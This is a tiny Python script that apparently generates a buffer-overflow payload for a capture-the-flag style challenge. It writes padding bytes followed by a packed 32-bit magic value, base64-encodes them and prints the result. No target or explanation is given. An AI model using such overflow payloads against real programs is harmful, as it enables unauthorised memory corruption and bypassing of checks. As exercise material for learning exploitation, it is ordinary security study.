
import sys
import struct
import base64

buf = b'FFFFFFFFFFFFFFF'
buf += struct.pack('<I', 611786951)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
